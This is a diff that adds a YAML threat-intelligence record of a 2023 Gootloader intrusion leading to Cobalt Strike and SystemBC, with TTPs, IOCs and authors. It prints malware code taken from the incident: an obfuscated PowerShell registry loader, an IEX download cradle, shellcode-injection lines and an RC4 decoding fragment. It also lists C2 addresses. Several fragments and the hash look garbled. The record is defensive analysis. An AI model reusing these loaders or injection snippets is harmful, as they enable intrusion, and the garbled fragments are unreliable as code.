@@ -1,0 +1,99 @@
+description: In February 2023, a user downloaded and executed a file from an SEO-poisoned
+  search result, leading to a Gootloader infection. The malware facilitated the deployment
+  of a Cobalt Strike beacon payload directly into the hosts registry and then executed
+  it in memory.
+malware_families:
+- Gootloader
+- Cobalt Strike
+- SystemBC
+TTPs:
+  processes:
+  - powershell.exe
+  - d1lhost.exe
+  - notepad.exe
+  - lsass.exe
+  commandline:
+  - '"C:\\Windows\\System32\\svchost.exe"'
+  - '"C:\\Windows\\System32\\wscript.exe"'
+  - '"C:\\Windows\\System32\\cscript.exe"'
+  - '"C:\\Windows\\System32\\powershell.exe"'
+  - powershell.exe -windowstyle hidden -ExecutionPolicy Bypass -File C:\\Users\\<REDACTED>\\AppData\\Roaming\\ls5.ps1
+  - C:\\Windows\\SysWOW64\\d1lhost.exe
+  - notepad.exe
+  powershell:
+  - 609265940; sleep -s (20); 60213434; $sxd="hkcu:\\software\\microsoft\\Personalization\\geRBAdXTDCkN";
+    $tGSWK=gp -path $sxd; for ($tGSWKgjA=0; $tGSWKgjA -le 705; $tGSWKgjA++){Try{$OHhnP+=$tGSWK.$tGSWKgjA}Catch{}};
+    $tGSWKgjA=0; while($true){$tGSWKgjA++; $ko=[math]::("sqrt")($tGSWKgjA); if($ko
+    -eq 1000){break}}$CVaW=$OHhnP.replace("#",$ko); $lSfdm=[byte[]]::("new")($CVaW.Length/2);
+    for($tGSWKgjA=0; $tGSWKgjA -lt $CVaW.Length; $tGSWKgjA+=2){$lSfdm[$tGSWKgjA/2]=[convert]::("ToByte")($CVaW.Substring($tGSWKgjA,2),(2*8))}[reflection.assembly]::("Load")($lSfdm);
+    [Open]::("Test")(); 809902482;
+  - IEX (New-Object Net.Webclient).DownloadString('http://127.0.0.1:12210/'); Get-DomainFileServer
+  - '$var_va.Invoke([IntPtr]::Zero, $v_code.Length, 0x3000, 0x40)
+
+    [System.Runtime.InteropServices.Marshal]::Copy($v_code, 0, $var_buffer, $u_code.length)
+
+    $var_runme = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($var_buffer,(func_get_delegate_type
+    @([IntPtr]) ([Void])))
+
+    $var_runne.Invoke( [IntPtr] ::Zero)
+
+    '
+  scripting_engine:
+  - '"C:\\Windows\\System32\\wscript.exe" "Frontline Management.js"'
+  - 's = "00016203040506076809020b0COd0e0101112131415161718191a1b1c1d11262122232425262728292a2b2c2d2e230315679d9018f7d16621f69bae16322157607580875e0338643b29cc597e507fa2296c8726b0e
+    60814b1BeubsTFaseuf1a"
+
+    b = binascii.unhexlify(s)
+
+    rcd = ARCU.new(key)
+
+    c2d = rcd.decrypt(c2b[:4])
+
+    cadb''\\x8e\\x81\\x8c\\xee*
+
+    '
+  registry_keys:
+  - HKCU\Software\Microsoft\Personalization\geRBAdXTDCkNcbkSBtbjQBNFy
+  - HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution
+    Options
+  image_load:
+  - C:\\Windows\\SysWOW64\\d1lhost.exe
+  network_connections:
+  - '"dllhost.exe" -> hxxp://46.28.105[.]94/xmlrpc.php'
+  - '"Cobalt Strike beacon" -> 91.215.85.143:443'
+  - powershell.exe -> 91.215.85.143:40019
+  - d1lhost.exe -> 91.92.136.20:4001
+  file_activity:
+  - C:\Users\<user>\AppData\Roaming\Frontline Management.js
+  - C:\\Users\\<REDACTED>\\AppData\\Roaming\\ls5.ps1
+  - C:\\Windows\\SysWOW64\\d1lhost.exe
+  persistence:
+  - Scheduled task named InfrSiRfucture Technologies
+  - Registry run key for SystemBC PowerShell script
+  - Scheduled Task
+  pipes:
+  - \\4fcc39
+  - \\netsvc\\1324
+  - \\4fcc39
+  - \\netsvc\\415
+  process_relations:
+  - powershell.exe -> d1lhost.exe
+IOCs:
+  hashes:
+  - c4190017b093db3094500
+  IPs:
+  - 46.28.105[.]94
+  - 91.215.85.143
+  - 91.92.136.20
+  domains:
+  - blog.lilianpraskova.cz
+  URLs:
+  - hxxp://blog.lilianpraskova.cz/xmlrpc.php
+  - http://127.0.0.1:12210/
+authors:
+- '@_pete_0'
+- '@malforsec'
+- '@r3nzsec'
+reference: https://thedfirreport.com/2024/02/26/seo-poisoning-to-domain-control-the-gootloader-saga-continues/
+date_of_publication: February 26, 2024
+file_creation_date: July 28, 2025
